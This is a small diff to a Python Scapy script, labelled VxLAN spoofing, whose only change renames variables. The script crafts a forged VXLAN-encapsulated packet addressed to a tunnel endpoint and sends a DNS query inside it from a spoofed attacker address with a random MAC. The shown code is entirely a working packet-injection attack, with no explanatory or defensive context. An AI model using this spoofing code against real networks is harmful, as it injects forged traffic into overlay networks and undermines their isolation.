@@ -23,6 +23,6 @@ testport=50408
 lookup = sys.argv[1]
 
 # Outer Header for VxLAN-Spoofing
-spoof_vxlan = IP(src=attacker_ip,dst=vtep)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=(1),flags="Instance")
+spoof_vxlan = IP(src=attacker,dst=vtep)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=(1),flags="Instance")
 # send dns request
-send(spoof_vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker_ip,dst=dns_ip)/UDP(sport=testport,dport=53)/DNS(rd=1,qd=DNSQR(qname=str(lookup),qtype="A")))
+send(spoof_vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,dst=destination)/UDP(sport=testport,dport=53)/DNS(rd=1,qd=DNSQR(qname=str(lookup),qtype="A")))
